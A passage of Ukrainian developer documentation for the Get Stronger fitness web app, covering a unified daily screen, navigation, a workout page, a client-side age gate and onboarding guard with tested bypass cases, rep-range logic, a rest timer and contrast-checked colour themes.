після стирання й відновлення дає те саме число** (1370 → 1370 Elo). Це
працює тому, що `ratingLog` — кеш, а не джерело правди: він
перебудовується з історії та `ratingSeen`.

Порівняння свідомо йде за змістом, а не за `JSON.stringify`: імпорт
перезбирає обʼєкти своїм порядком ключів, і буквальне порівняння
показувало б втрату там, де її немає.

### Дрібніше

- `theme_color` у `manifest.webmanifest` був `#080a0d`, а в усіх
  шістнадцяти сторінках — `#161a20`. У standalone-режимі це різні
  кольори смуги й фону. Вирівняно на `#161a20`; `background_color`
  лишився темнішим — він для сплеша.
- Прибрано мертві токени `--brand` і `--nav-bg`: обидва оголошувались у
  пʼяти темах і не читались жодним `var()` — залишок від часів, коли
  шапка фарбувалась `color-mix()`. Усі вісім тем перевірено після
  видалення.
- `verifyresponsive.mjs` лаявся на чекбокс 16×16 у `plan.html`. Це була
  помилка перевірки, а не розмітки: чекбокс загорнутий у `<label>`, і
  ціль дотику — весь підпис. Виняток додано до скрипта.

### Що шукали й не знайшли

Мертвого коду немає: жодної неоголошеної функції без вживання, жодного
невживаного CSS-класу з 268 (усі «підозрілі» — модифікатори, що
збираються конкатенацією в JS). Немає `TODO`, `debugger`, `console.log`,
тестових даних і ключів у коді — `js/config.js` порожній, а anon-ключ
Supabase публічний за визначенням. Немає `?.`, `??`, `class`,
`color-mix()`, `@container` — нічого, що зламало б Safari на iOS 13.

## 11з. Один екран дня, один цикл (етап 10)

Get Stronger був технічно сильним і продуктово розсипаним: набір інструментів,
кожен на своїй сторінці. Цей етап нічого не додав — він звʼязав наявне.

### Головних екранів було два

`index.html` переказував стан і вів кнопкою на `today.html`, де стан можна
було ЗМІНИТИ. Одне питання — «що в мене зараз» — і дві сторінки, які на
нього відповідали. Коштувало це не тільки зайвого переходу в кожній
щоденній дії: два місця читали профіль по-різному й могли розійтись у
показаннях. Так і сталось із рейтингом (нижче).

Тепер сторінка одна: **`index.html` і є «Сьогодні»**. `today.html` лишився
перенаправленням — на нього посилаються старі закладки, ярлик «На екран
Home» і зовнішні лінки. `js/home.js` прибрано, його плитки переїхали в
`js/today.js` до решти карток.

Порядок карток = порядок питань:

| | Питання | Картка |
|---|---|---|
| 1 | Як у мене справи? | Get Stronger Rating + три плитки стану |
| 2 | Що робити сьогодні? | Тренування — список вправ із вагами |
| 3 | Скільки лишилось? | Харчування |
| 4 | Як відновлення? | Трекери дня |
| 5 | Куди це веде? | Тиждень + посилання на «Прогрес» |

### Rating показував «—» тому, хто тренувався три тижні

Плитка рейтингу на старій головній читала лише кеш `profile.ratingLog`, а
`recompute()` жив на «Сьогодні» й `rating.html`. Хто не заходив туди —
бачив на головній прочерк і підпис «зʼявиться після тренування», маючи за
плечима три тижні тренувань. Головний екран повідомляв людині неправду про
її власні дані, і саме про ту метрику, яка відрізняє Get Stronger від решти.

Відколи головна — це «Сьогодні», перерахунок відбувається там, де його
показують. Але з двома правилами чесності:

- **Немає фактів — немає рейтингу.** `refreshRating()` перевіряє
  `RatingCore.hasData(history)` і при порожній історії не рахує й нічого
  не зберігає. Без цього `recompute()` записав би в профіль сьогоднішній
  нуль, а від нього засвітився б бейдж «Level 1» у шапці — у людини, яка
  щойно відкрила Get Stronger уперше. Картка натомість каже «Недостатньо даних».
- **Нуль ≠ порожньо.** Нуль у Get Stronger Rating — реальний результат («робив,
  але не набрав»). Відрізнити його від «ще нема з чого рахувати» за самим
  числом неможливо, тому розрізняє наявність фактів, а не значення.

Картка тепер відповідає на всі чотири питання про метрику: поточне число,
зміна за сьогодні й за тиждень, що саме її піднімає, і — головне — що
тягне вниз. Останнє потребувало нового погляду на модель: `reasons`
кажуть лише, ЩО додало балів, а в цій моделі вниз тягне ВІДСУТНІСТЬ балів.
Побачити її можна тільки порівнявши score сигналу з його максимумом —
для цього в ядро додано `signalBreakdown()`. Нічого нового він не рахує:
це ті самі чотири виклики, що робить `dailySignals()`, повернуті окремо.

Порада під розкладом залежить і від того, чи сьогоднішній факт уже є:
екран не радить «закрий тренування дня» тому, хто його щойно закрив, — у
такому разі він чесно каже, що бракує частоти за останні тижні.

### Навігація: чотири розділи замість пʼятнадцяти

Було пʼятнадцять рівноправних пунктів. Стало **CORE** — чотири розділи
щоденного циклу (Сьогодні, Тренування, Харчування, Прогрес) — і все інше
всередині них. Жодну сторінку не прибрано: «Плани тренувань» і
«Періодизація» тепер під «Тренуванням», «План харчування» й «Добавки» —
під «Харчуванням», «Get Stronger Rating» — під «Прогресом», «Трекери» та решта —
в «Іншому».

На телефоні зʼявилась **панель розділів унизу екрана** — ті самі чотири
CORE. До цього єдиним входом у навігацію був бургер у верхньому правому
куті: два дотики й повноекранна накладка заради переходу, який у
застосунку коштує один дотик у зоні великого пальця. Панель не дублює
бургер, а знімає з нього щоденне; у бургері лишається все інше.

Побудована з наявних токенів (`--glass-2`, `--line`, `--acc-ink`) — нових
кольорів і радіусів не зʼявилось. Враховує безпечну зону iOS, піднімає над
собою таймер відпочинку й тости, ховається при друку.

### Пояснення більше не стоять перед дією

Get Stronger пояснює свої числа, і це його сильна сторона — але на «Схемах» текст
«Як читати таблицю» займав 42% висоти сторінки, на «Кардіо» — 66%. Щодня
гортаєш повз те, що прочитав один раз.

Текст нікуди не дівся — він **згортається**. Береться той самий акордеон,
що вже є в дизайн-системі (`.acc` + `initAccordions`): нових компонентів і
станів не зʼявилось, а розмітка сторінок лишилась читабельною — там просто
стоїть `data-longform`. Решту робить `App.initLongform()`.

Висота сторінок на порожньому профілі:

| Сторінка | Було | Стало |
|---|---|---|
| Плани тренувань | 4781 px | 1951 px |
| Калькулятор 1ПМ | 5903 px | 3304 px |
| Раціон | 6015 px | 4288 px |
| Прогрес | 4250 px | 2839 px |
| Get Stronger Rating | 3711 px | 2051 px |
| Мої трекери | 3001 px | 2031 px |

### Числа виглядають однаково

Кожна сторінка форматувала їх сама: десь `String(n)` із крапкою, десь
`.replace('.', ',')`, десь `toFixed(1)`, а в списку ваги — сире значення з
журналу, тому там зʼявлялось `82.10000000000001 кг`, яке ще й
переносилось на два рядки й ламало вирівнювання.

Правило тепер одне й живе в `App.fmtNum` (`js/app.js`): **спочатку
округлити, потім поставити кому**. Для кожного типу даних — своя функція
з фіксованою кількістю знаків (`kg` 1, `kcal` 0, `gram` 0, `pct` 0,
`elo` 0, `hours` 1), плюс `signed()` для дельт і `dur()` для хвилин.
Нечислове дає прочерк, а не `NaN`: у Get Stronger прочерк скрізь означає «даних
немає».

Локальні копії форматера прибрані з `js/trackers.js`, `js/nutrition.js`,
`js/meals.js`, `js/journal.js` — 12 замін лише в журналі. Робочі ваги в
полях вводу теж показуються з комою: людина набирає кому й бачить кому,
а зчитує значення функція, яка приймає обидва знаки.

## 11и. Тренування — окремий екран (етап 11)

Список вправ розгортався просто на «Сьогодні». Короткий огляд дня
перетворювався на нескінченний скрол: на телефоні головна відкривалась
довжиною в дванадцять вправ, а щоб дійти до харчування чи трекерів, треба
було прогорнути весь зал. Саме тренування при цьому не можна було ні
відкрити, ні закрити як окремий контекст — воно просто ЛЕЖАЛО там.

Тепер це два екрани:

| | «Сьогодні» | `workout.html` |
|---|---|---|
| Роль | короткий огляд дня | повний екран залу |
| Тренування | картка-вхід: програма, день, обсяг, прогрес | вправи, підходи, ваги, RIR, таймер |
| Дія | «Відкрити / Продовжити тренування →» | галочки, ваги, вибір дня, відпочинок |

Це саме сторінка, не модалка: власний URL, власний заголовок, працює
«Назад» браузера, її можна відкрити з панелі розділів. Повернення —
рядком `.backlink` над заголовком, 44px заввишки: це головний шлях назад,
і на телефоні він має бути там, куди дивишся першим.

Висота головної на порожньому профілі впала з 3900+ до ~3000 px, і в цих
трьох тисячах більше немає жодного рядка вправи.

### Один день на два екрани

Головній однаково треба знати, ЩО заплановано й скільки закрито — інакше
картка-вхід не показала б «Виконано 1 з 14». Щоб ці дві відповіді не
розійшлись, розвʼязання плану й денний стан переїхали в
`js/workout-core.js`: DOM-free модуль, який обидві сторінки читають
однаково. Дня тижня в ньому немає й не буде — який день робити, вирішує
людина, а `readDay()` лише пропонує наступний після минулого.

Ядро — єдиний власник ключа `forge.today`: і читання, і запис. Це не
порушення правила «ядра без побічних ефектів», а його зворотний бік:
формат ключа знає рівно одне місце.

### Настрій сесії — наявний трекер, а не нова система

Блок «Настрій перед / після тренування» — це вбудований трекер
`workoutMood` (`kind: 'pair'`, поля `before`/`after`) з
`js/tracker-core.js`. Дані лежать там, де й решта трекерів:
`profile.trackerLog.workoutMood[дата]` — тобто прив'язані до сесії тією ж
датою, якою підписаний `sessionLog`. Жодної другої моделі даних, жодної
нової схеми.

Опційність теж не власна: трекер вмикають на «Відновленні», і поки він
вимкнений, блок **не рендериться взагалі** — не займає ні місця, ні уваги.
Це картка внизу сторінки, а не крок: почати чи завершити тренування вона
не заважає.

### Що знайшлось по дорозі

Сторож «не перемальовуй, поки людина в полі» мав вікно в пів секунди й
відлічував його від останньої зміни ФОКУСА. Якщо в полі довго набирали —
набрав вагу, подумав, аж потім тицьнув у сусіднє — мітка встигала
протухнути, і `change` при переході знову ловив `activeElement === body`:
сторож не спрацьовував, `render()` зносив поле, куди щойно тицьнули.

Виправлено двома рівнями. Мітку тепер оновлює й набір (`input`), не лише
фокус. І, головне, додано той самий запобіжник, що вже був на «Моєму
плані»: **сторінка не перемальовується на власний запис**. Дивитись треба
не на людину, а на джерело події — усі збереження йдуть через `saveOwn()`,
який ставить мітку, а `Store.onChange` у її межах оновлює дані без
перебудови DOM. Те саме отримала й головна.

## 11і. Віковий гейт (етап 12)

Get Stronger доступний лише з 18. Перший екран нового користувача — дата
народження, і нічого більше. З етапу 13 вік — перший крок повного
онбордингу (див. 11і), але його логіка не змінилась: він завжди перший
і не має винятків.

### Чому це не компонент

Екран із датою сам по собі не захищає нічого: його обходять прямим URL,
кнопкою «назад», перезавантаженням або закладкою на внутрішню сторінку.
Тому перевірка стоїть **перед кожною сторінкою**: `js/agegate.js`
підключений у `<head>` усіх 17 сторінок **без `defer`** і виконується
синхронно — рішення ухвалюється раніше, ніж зʼявиться перший рядок
розмітки, тож проблиску застосунку неповнолітній не побачить.

### Джерело правди — профіль, а не прапорець

Окремого «гейт пройдено» немає **навмисно**: такий прапорець і був би
тим, що підробляють. Рішення щоразу виводиться з `profile.birthDate`,
тому підстановка `{ageGatePassed: true}` у localStorage не дає нічого —
потрібна саме дата, і саме доросла. Перевірено вісьмома спробами обходу:
вигаданий прапорець, самий лише числовий `age`, дата з майбутнього,
неіснуючий день, сміття, число замість рядка, 1850 рік і день до
18-річчя — жодна не пускає.

Імпорт профілю теж не діра: `case 'birthDate'` у валідаторі приймає
дату лише якщо `AgeCore.isAdult()` каже так. Файл із дитячою датою поле
просто не отримує.

### Чесно про межу

Get Stronger — статичний сайт без сервера. Будь-яку клієнтську перевірку можна
обійти, вписавши дорослу дату руками або вимкнувши JavaScript. Сторож
робить максимум можливого без бекенда: закриває звичайні шляхи і не має
обхідного прапорця. Справжній бар'єр можливий лише там, де рішення
ухвалює сервер.

### Дата, а не вік числом

У профілі вже було `age` — число, яке вписують руками. Для повноліття
воно не годиться: рік по тому там те саме число. Тому додано
`birthDate` (`YYYY-MM-DD`) як джерело правди, а `age` став **похідним** —
його рахує гейт із дати. Розрахунки харчування й пульсу читають `age` як
і раніше, їх ця зміна не торкнулась.

Міграція 5 → 6 старим профілям дату **не вигадує**: із числа 30 відновити
день народження неможливо, а приблизна дата — це підсунуті людині чужі
дані про себе. `birthDate` лишається `null`, і на першому ж відкритті
сторож попросить ввести її — рівно один екран.

### Арифметика під тестами

`js/age-core.js` — чисті функції, «сьогодні» завжди аргументом, тому межу
можна перевірити на самому дні народження. 25 тестів, зокрема:

- за день до 18-річчя — 17, у сам день — 18;
- високосний день народження: 29 лютого 2008 → повноліття 1 березня 2026,
  а не 28 лютого;
- `new Date('2000-01-31')` — це UTC-північ, і на захід від Гринвіча вона
  ставала 30 січня за місцевим часом: вік зсувався на добу рівно там, де
  це найважливіше. Дата збирається покомпонентно.

Сам сторож містить свідому мінімальну копію цієї арифметики: ядро
підключене з `defer` і на момент перевірки ще не виконалось, а чекати на
нього означало б показати сторінку раніше за рішення.

### Дизайн

Нової системи немає: картка — та сама `.card` із неоморфною тінню, поле —
`.input[type=date]`, кнопка — `.btn.btn--primary`. Власне лише
центрування на весь екран, два стани повідомлення й інверсія іконки
календаря (у темній темі Chrome малює її чорною на темному).

## 11ї. Онбординг як ворота (етап 13)

Get Stronger не показує нічого, поки профіль не повний: **вік → тіло →
програма з робочою вагою**. Тільки після третього кроку застосунок
відкривається весь.

### Стан даних, а не екрани

Єдине джерело правди — `OnboardingCore.stepFor(profile)`
(`js/onboarding-core.js`, чистий модуль під тестами):
`'age' | 'body' | 'program' | 'done'`. Крок щоразу **виводиться з
наявності полів** у профілі; окремого `onboardingComplete` немає з тієї
самої причини, що й у вікового гейта — прапорець і є те, що підробляють.

Критерії: вік — доросла `birthDate`; тіло — `sex`, `weight`, `height`,
`activity` у тих самих межах, що й у валідатора імпорту (два різні
уявлення про «коректну вагу» дали б профіль, який імпорт приймає, а
онбординг ні); програма — `activePlan.programId` **і хоча б одна робоча
вага**. Повний план — це 20–40 полів перед першим входом, така стіна
втрачає людей; одна вага означає, що людина знайшла поле і почала, решту
план і «Сьогодні» просять контекстно, як і було задумано.

### Сторож

`js/agegate.js` виріс із вікового сторожа до сторожа онбордингу: він
підключений синхронно в `<head>` **усіх** сторінок (тепер і welcome.html)
і тримає мінімальну копію критеріїв ядра. Кожен крок має свій дозволений
набір сторінок: вік — лише `welcome.html`; тіло — `welcome.html` і
`account.html`; програма — `programs.html`, `plan.html`, `account.html`;
done — усе, крім `welcome.html`. Все інше — `location.replace` на
сторінку кроку, тож «назад» не замикає в циклі.

`account.html` відкритий з кроку «тіло» навмисно: людина з резервною
копією мусить мати куди її імпортувати. Після імпорту повного профілю
онбординг зараховується сам — стан виводиться з даних.

### Наявні користувачі

Профіль із журналами (`bodyLog`, `workLog`, `sessionLog`, `mealLog`,
`weightLog`, `trackerLog`) — це людина, яка жила у Get Stronger до появи цих
кроків. `hasHistory()` зараховує їй онбординг: історія — доказ,
виведений з даних, а не прапорець. Вік історія **не** скасовує.

### Крок «тіло»: склад полів

Порядок фіксований: стать → вага → зріст → рівень активності → стаж
тренувань → пульс спокою і максимальний пульс (обидва необовʼязкові:
без них зони кардіо рахуються від віку, 208 − 0,7 × вік).
Стаж — те саме поле `trainingAge`, що вже керує прогнозом ваг; з цього
етапу він також визначає діапазони повторень у плані (див. нижче).
Placeholder зникає одразу на фокусі (`.input:focus::placeholder`).

### Діапазони повторень — похідне від стажу

Єдине джерело правди — `js/reps-core.js`:

| Стаж            | Великі групи | Малі групи |
|-----------------|:---:|:---:|
| До 1 року       | 8–10 | 10–12 |
| 1–2 роки        | 8–10 | 10–12 |
| 3–5 років       | 6–8  | 8–10  |
| Понад 5 років   | 6–8  | 8–10  |

Розмір групи НЕ класифікується заново: він лежить у `MUSCLES`
(js/exercises.js, поле `size`), цільову групу вправи визначає наявний
`primaryMuscle` — перша у списку `muscles`. Застосування централізоване:
`RepsCore.applyPlan()` викликають рівно дві точки — `loadPlan`
(js/programs.js) і `resolvePlan` (js/workout-core.js), через які проходять
усі чотири програми. reps не зберігається як факт — це похідне: зміниш
стаж, план перерахується при наступному завантаженні, включно зі
збереженими правками (customPlans). Стаж не вказано (старі профілі) —
безпечний ярус новачка. Перевірки: tests/reps-core.test.js (15) і
tools/verifyreps.mjs (25 у живому UI).

### Екрани

Кроки «вік» і «тіло» живуть на одному екрані `welcome.html`
(`js/welcome.js` малює той крок, що каже `stepFor`) — між ними немає
навігації. Крок «програма» — це наявні `programs.html`/`plan.html` без
двійників: банер `#onboard-banner` (js/programs.js) каже, де людина і що
лишилось, а після першої збереженої ваги пропонує «Відкрити Get Stronger».
Поки онбординг триває, шапка згорнута до знака (js/app.js): меню, кожен
пункт якого відвертає назад, — не навігація.

Мертвий після цих воріт шлях «перший запуск» на головній
(`#dash-intro` + `isFirstRun()`) прибрано: до `index.html` тепер
неможливо дійти з порожнім профілем.

### Чесно про межу

Та сама, що й у вікового гейта: без сервера будь-який критерій можна
виконати, вписавши поля в localStorage руками. Сторож закриває звичайні
шляхи — URL, історію, перезавантаження, прапорці, сміттєві значення
(перевірено `tools/verifyonboarding.mjs`, 28 перевірок) — а не людину з
відкритою консоллю.

## 12. Навігація

Шапка: **Сьогодні**, **Програми**, **Мій план**, **Харчування**,
**Раціон**, далі **Прогрес** (група: Огляд прогресу, Мої трекери,
Get Stronger Rating), **Інше** (Періодизація, Бокс, Кардіо, 1ПМ, Добавки,
Дослідження) і «Акаунт», притиснутий до правого краю: це вхід і власні
налаштування, ховати їх у «Інше» означало б шукати себе у смітнику.

«Мої трекери» і «Get Stronger Rating» переїхали з «Іншого» під «Прогрес» (етап 7):
всі троє відповідають на те саме питання «як у мене справи», а звалище з
восьми пунктів скоротилось до шести. Щоденні сторінки як були на верхньому
рівні, так і лишились — кліків нікому не додалось.

«Сьогодні» стоїть першим: перше місце в шапці відповідає першому питанню
дня — «що мені робити зараз». «Бокс» переїхав у «Інше»: це одне окреме
тренування, а не щоденний розділ, і воно ні з чим у застосунку не звʼязане.

До цього тренувальні й харчові сторінки були згруповані у два випадні меню:
«Мій план» і «Періодизація» ховались під «Програмами», «Прогрес» і «Раціон» —
під «Харчуванням». Щоб потрапити на сторінку, якою користуєшся щодня, треба
було спершу навести на іншу, а на тач-екрані — влучити в стрілку. Тепер до
кожної один клік, і видно, що вони взагалі існують.

Випадне меню лишилось одне — «Інше». Там довідкові сторінки, які відкривають
зрідка. Власної сторінки в групи немає, тому батько сам є кнопкою-перемикачем.
Відкривається наведенням або кліком. `padding-top` у меню — місток, без якого
курсор на шляху вниз пролітає щілину і :hover рветься. Escape і клік повз
шапку закривають; у бургері меню розгортається в список із відступом, стрілка
ховається.

### Мобільне меню (етап 7)

Меню в бургері — сімнадцять рядків, приблизно 930px. На екрані 390×844 під
шапкою лишається близько 770px, а `position: fixed`-блок, що вилазить за
нижню межу вікна, **не скролиться сам**. Тобто «Дослідження» й «Акаунт» на
телефоні були недосяжні взагалі — сторінка налаштувань не мала іншого входу.

Виправлено `max-height: calc(100dvh - var(--nav-h))` + `overflow-y: auto`.
`dvh`, а не `vh`: з висувною адресною смугою `vh` бреше саме в той бік, що
ховає низ. Заодно `--nav-h` тепер перевизначається в мобільному брейкпоінті
(74px замість 80): раніше правився `min-height` шапки, а змінна лишалась
старою, і між шапкою та меню просвічувала сторінка.

Escape закриває бургер і повертає фокус на кнопку. До етапу 7 обробник
Escape чіпав лише випадні групи всередині меню — людина з клавіатури
лишалась у накладці без способу вийти.

### Кнопки в герої головної (прибрано на етапі 7)

Герой із перемиканням головної кнопки зник разом із самим героєм: головна
тепер панель, і «головна дія» на ній — не кнопка, а картка `.dash-main`,
яка сама залежить від стану (див. розділ 11а).

Три деталі реалізації, які лишились актуальними для інших місць:

- **Порядок міняє `order`, а не DOM.** Посилання лишаються на місцях у
  розмітці, тому порядок табуляції й читання читалкою збігаються з видимим.
- **Перемикаються класи `btn--primary` / `btn--ghost`**, а не власні стилі:
  ці два вже описані для всіх восьми тем разом із піднятими акцентними
  станами. Дев'яте оформлення відставало б від решти.
- **Два кроки замість одного.** `getProfile()` у хмарному режимі йде в
  мережу, і до відповіді герой показував би «плану немає» тому, у кого план
  є. Тому спершу синхронний `Store.localProfile()`, потім уточнення. Локальну
  копію беремо лише без хмарної сесії: під чужим акаунтом у localStorage
  можуть лежати залишки попереднього.

Розмітка лишається станом «плану немає» — правильний запасний варіант і для
першого відкриття, і якщо скрипт не виконався.

### Пороги й каскад

Поріг бургера повернувся з 720 до **1060px**: пунктів у рядку вісім замість
чотирьох (~800px проти ~330), і разом із лок-апом 193px це вимагає ~1050.
Історія порога: 900 → 960 (більше лого) → 1000 (11 пунктів) → 720 (групи) →
1060 (плоский список).

У діапазоні 1061–1200px відступи й кегль стиснуті — це дешевше, ніж ховати
пункти. `white-space: nowrap` на `.nav__link` обовʼязковий: без нього flex
тиснув пункти по ширині й «Мій план» ламався на два рядки, роблячи шапку
різновисокою.

Адаптивні правила шапки лежать **після neo-шару**, а не у верхній секції
файла. Neo-шар перевизначає `.nav__link` і `.nav__drop-in` беззастережно, тому
медіазапити згори він перебивав: відступи лишались десктопними на вузькому
екрані, а список у бургері малювався плаваючою карткою з фоном і тінню
замість простого списку з відступом.

## 13. Журнал, таймер, теми

### Прогрес (journal.html): вага тіла й теплокарта

Файл лишився `journal.html`, сторінка називається «Прогрес» (детально
про огляд, прогноз-проти-факту, силу й харчування — розділ 11в). Тут —
дві найстаріші її частини, вага тіла й теплокарта тренувань; єдина
сторінка, що накопичує історію — решта профілю знімок поточного стану.

**Вага тіла.** Одне число на день у `bodyLog`; графік показує точки як є
і ковзну середню за 7 календарних днів — саме календарних, а не за 7
останніх записів, інакше пропуски розтягували б вікно. Це закриває
суперечність, яку сайт створював сам собі: калькулятор просив «коригуй за
динамікою», а записувати динаміку не було куди.

**Клітинки тренувань.** Пів року по днях, стиль трекерів активності, але
насиченістю кольору теми, не зеленим — правило «статус яскравістю» діє й
тут. День позначається кнопкою або сам, коли додзвонює таймер відпочинку.
Дати ЛОКАЛЬНІ (`YYYY-MM-DD` руками, не `toISOString`): зважування о 23:40
у Києві має лягти в сьогодні, а UTC поклав би його в завтра.

### Таймер відпочинку (на «Моєму плані»)

Клітинка «Відпоч.» — кнопка: 3 хв для великих груп, 2 хв для малих.
Правило замінило рядки-діапазони з даних («2–3 хв») при показі, копіюванні
й оцінці тривалості; самі дані не чіпались. Кругові блоки («—») без змін.

Кінець рахується від міток часу, а не від кількості тіків інтервалу:
браузери сповільнюють інтервали у фонових вкладках, і таймер на тіках
брехав би саме тоді, коли на нього не дивляться. У кінці — два гудки
осцилятором (без аудіофайлів) і вібрація, день позначається в журналі
один раз.

### Теми

Вісімнадцять — **дві сімʼї по девʼять**, із тим самим набором акцентів:

| | Navy blue | Рожевий | Дерево | Фіолетовий | Багрянець | Бурштин | Мох | Смарагд | Океан |
|---|---|---|---|---|---|---|---|---|---|
| **Кольорові** | `null` | `pink` | `wood` | `violet` | `crimson` | `amber` | `moss` | `emerald` | `ocean` |
| **Графітові** | `graphite-navy` | `graphite-pink` | `graphite` | `graphite-violet` | `graphite-crimson` | `graphite-amber` | `graphite-moss` | `graphite-emerald` | `graphite-ocean` |

(Раніше тут значилась ще «червона» — теми з таким id не існує, це був
залишок у списку.)

Перші чотири — той самий каркас: палітри згенеровані з navy зі збереженням
яскравості кожного кольору (крутиться лише відтінок), тому контрастні пари
успадковуються; потім кожна перевірена окремо за тими самими порогами
(текст ≥ 4.5:1, елементи ≥ 3:1).

**Пʼять доданих відтінків підібрані пошуком, а не на око.** Для кожного тону
скрипт перебирає простір HSL і бере значення, які одночасно проходять усі
пороги: білий текст на заливці кнопки ≥ 4,5:1; `--acc-ink` як колір тексту
≥ 4,6:1 на обох поверхнях і на графітовій картці; смуги даних і межі ≥ 3:1.
Тому кожен новий токен має пояснення у вигляді числа, а не смаку.

Заливка навмисно лишилась ТЕМНОЮ в усіх пʼяти. Світла вимагала б `--on-acc`,
але галочка виконаної вправи й повзунок перемикача мальовані білим намертво
(`stroke='white'`, `background:#fff`) — на світлій заливці вони б зникли.
Характер відтінку тому несуть `--acc-bar` і `--acc-ink`, а не кнопка.

Бурштин — єдиний із власними налаштуваннями генератора. На «чесному» тоні 45°
заливка виходила оливково-бурою і майже не відрізнялась від дерева; тон
зсунуто до 38°, насиченість піднято, поверхні взято тепліші (34°). Пороги при
цьому ті самі — зсув міняє характер, а не запас контрасту.

Виміряні пари (в живому DOM, не з генератора):

| Тема | білий на заливці | `--acc-ink` на картці | смуга | межа |
|---|---|---|---|---|
| Багрянець | 5,70 | 8,09 | 5,20 | 3,60 |
| Бурштин | 5,70 | 7,66 | 5,20 | 3,60 |
| Мох | 5,70 | 7,40 | 5,20 | 3,60 |
| Смарагд | 5,70 | 7,43 | 5,20 | 3,60 |
| Океан | 5,70 | 7,63 | 5,20 | 3,60 |

**Назва акценту одна на обидві сімʼї.** Спершу кожна сімʼя мала власний масив
підписів, і вони розʼїхались: у кольорових стояло «Рожева / Фіолетова /
Багрянець», у графітових — «Рожевий / Фіолетовий / Багряний». Той самий
акцент називався двома різними словами в сусідніх рядах. Тепер у
`js/account.js` є один список `ACCENTS`, а обидві сімʼї добудовуються з нього
(`ACCENTS.map(...)`) — розійтись їм більше нема як.

Усі вісімнадцять стереже `tools/verifythemes.mjs` — 182 перевірки: контраст
шести пар у кожній темі, непрозорість поверхонь, спільна поверхня всієї
графітової сімʼї, різні поверхні всієї кольорової, збіг підписів між сімʼями
рядок у рядок, вибір плашкою на сторінці акаунта та імпорт профілю з новою й
вигаданою темою.

**Графітова сімʼя побудована за іншим принципом.** У чотирьох кольорових темах тон
заходить і в поверхні — картка успадковує відтінок бренду, тому фон ледь
помітно рожевий, деревʼяний чи фіолетовий. У графіті поверхні НЕЙТРАЛЬНІ:
чистий графіт без домішки тону, а колір лишається рівно там, де щось
означає — кнопки, активні стани, дані, фокус. Глибина тримається на дрібних
сходинках яскравості (2–4%) і неоморфних тінях, а не на кольорі:

```
#131416  поле вводу      →  найглибше
#17181a  тло сторінки
#1e2022  картка
#26282b  вкладена поверхня
```

#### Акцентні елементи — підняті, не втоплені

Правило на весь сайт, у **всіх восьми темах**: усе, що залито акцентом,
підняте над поверхнею, ніколи не втоплене й ніколи не має внутрішнього
підмішування кольору.

До цього було навпаки. Активний сегмент, чипи й `.eyebrow` несли
`--neo-inset-sm`, а фон їм рахував `color-mix(--acc 22%, --field)` — тобто
акцент, розведений кольором поля на 78%. Разом це давало ямку, залиту
напівпрозорим кольором, замість кнопки. У `.btn--primary` і активного пункту
навігації була ще й друга, біла тінь `-4px -4px` — на сірій поверхні вона
читається як об'єм, а на суцільному кольорі як відблиск, тобто як градієнт.

Чотири токени в нео-шарі, тільки темна тінь, без зустрічної світлої грані:

```
--acc-raised     7px  7px 16px  rgba(0,0,0,.46)   кнопка
--acc-raised-hi  10px 10px 24px rgba(0,0,0,.52)   наведення
--acc-raised-sm  4px  4px 10px  rgba(0,0,0,.40)   чипи, сегменти, навігація
--acc-raised-xs  2px  2px 6px   rgba(0,0,0,.36)   натискання, теплокарта
```

Натискання акцентної кнопки — **коротший хід тіні, а не її вивертання**:
загальне правило `.btn:active { box-shadow: var(--neo-inset-sm) }` для сірих
кнопок лишається (натиснута поверхня вминається), але `.btn--primary` його
перебиває.

Текст на суцільній заливці — `var(--on-acc, #fff)`, бо `--text` на ній уже
не гарантує контрасту. Перевірено у восьми темах: мінімум **4,64:1**.

> **Чесно про кольорові теми.** У них картка сама підфарбована брендом, тому
> акцентна плашка відрізняється від неї слабко: navy 1,17:1, дерево 2,21,
> фіолетова 2,42 (рожева 3,17 — нормально). Форму там тримає тінь, а не
> контраст заливки. Підняти цю пару можна лише змінивши сам акцент, а його
> міняти не можна. У графітових темах цієї проблеми немає: 3,28–4,35.

Три `inset` із **нульовим розмиттям** лишились навмисно: `inset 3px 0 0` у
цільовому рядку таблиці й тості та `inset 0 0 0 1px` у клітинці поточного
тижня — це смужки-маркери й контур, намальовані тінню, а не вгнутість.
Прибрати їх означало б прибрати самі маркери.

#### Одна основа на чотири варіанти

Дизайну чотири рази не існує — він один. Спільна основа живе під селектором
`html[data-theme^="graphite"]` (префіксний збіг), а кожен варіант дописує до
неї **тільки акцентні токени**. Додати ще один графіт — це десяток рядків
кольору, а не нова тема. У блоках варіантів немає жодного рядка про поверхні,
і це навмисно: там, де їх немає, вони й не розійдуться.

#### Вибір акценту

Акценти не нові — узяті з відповідних кольорових тем. Вибирається лише те,
**який із наявних токенів палітри** іде на заливку кнопки, за двома порогами:
білий текст на заливці ≥ 4,5:1 і сама заливка ≥ 3:1 до картки. У кольорових
темах картка підфарбована, тут вона графітова, тому «рідний» `--acc` не всюди
проходить:

| Варіант | Заливка | Наведення | Текст на ній |
|---|---|---|---|
| Дерево | `#93663e` (`--acc-hi`) | `#7a5230` темнішає | білий 4,99 |
| Рожевий | `#c43e72` (`--acc`) | `#a93060` темнішає | білий 4,91 |
| Фіолетовий | `#8063c7` (`--acc-hi`) | `#6b4ab8` темнішає | білий 4,64 |
| Navy blue | `#6685b6` (`--acc-bar`) | `#9eb9e1` світлішає | **темний** 5,15 |

Три перші однакові за логікою: заливка на крок світліша за «рідний» `--acc`,
наведення повертається до нього, тобто темнішає — втоплена поверхня під
курсором доречніша неоморфізму, ніж спалах.

**Navy — виняток, і не з примхи.** На графіті жоден її токен не тримає білий
текст одночасно з видимістю заливки: `--acc` (#202f46) і `--acc-hi` (#2c4160)
дають заливку 1,21 і 1,58 до картки — кнопки просто не видно; `--acc-line`
(#64809f) дає заливку 3,99, але білий лише 4,09 при нормі 4,5. Тобто темний
бік палітри на графіті зникає, а світлий не тримає білий текст. Тому там
світла заливка з ТЕМНИМ текстом і наведення світлішає — рух завжди геть від
поверхні, просто тут поверхня знизу, а не зверху. У кольоровій темі navy цієї
проблеми не було, бо там картка сама була синьою.

Для цього в систему заведено `--on-acc` — колір тексту НА акцентній заливці,
з фолбеком `#fff`. Жодна тема, крім `graphite-navy`, його не задає, тому для
всіх решти це рівно той білий, що був. Пʼять доданих відтінків теж лишились
на білому — саме тому їхні заливки шукались у темному діапазоні.

Кольорових градієнтів у графіті немає. Чотири спільні правила, де вони
з акцентом (`.bg-fx`, `.gradient-text`, `.card::before`, смуга обʼєму),
перекриті точково для `html[data-theme="graphite"]`. Єдиний, що лишився, —
діагональна штриховка «обʼєм понад межу»: вона несе стан, і без неї
«на межі» й «за межею» стали б однаковими смугами; білий у ній замінено
на графіт.

